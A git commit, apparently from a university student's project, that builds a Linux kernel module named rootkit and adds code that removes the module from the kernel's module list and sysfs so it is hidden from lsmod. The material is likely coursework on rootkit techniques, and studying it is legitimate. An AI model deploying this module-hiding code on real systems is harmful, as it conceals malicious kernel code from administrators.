9d6ca8351c498fec697eff10483e4888b1265039
Joshua Poole <z5309172@ad.unsw.edu.au>
2025-07-29 21:38:59 +1000

    Fixed Makefile to work on VM and fixed rootkit.c to actually reference stuff

--- Makefile
+++ Makefile
@@ -1,2 +1,10 @@
-rootkit: rootkit.c
-     gcc -o rootkit rootkit.c
+obj-m := rootkit.o
+KDIR := /lib/modules/$(shell uname -r)/build
+PWD := $(shell pwd)
+
+all:
+	$(MAKE) -C $(KDIR) M=$(PWD) modules
+
+
+clean:
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
--- rootkit.c
+++ rootkit.c
@@ -1,16 +1,28 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/list.h>
+#include <linux/kobject.h>
+
+int hide_module(void);
+
+int hide_module(void) {
+    list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    return 0;
+}
 
 static int __init mod_init(void) {
-    prink(KERN_INFO "rootkit: init\n");
-
+    printk(KERN_INFO "rootkit: init\n");
+    hide_module();
     return 0;
 }
 
 static void __exit mod_exit(void) {
-    prink(KERN_INFO "rootkit: exit\n");
+    printk(KERN_INFO "rootkit: exit\n");
 }
 
 module_init(mod_init);
 module_exit(mod_exit);
+
+MODULE_LICENSE("GPL");
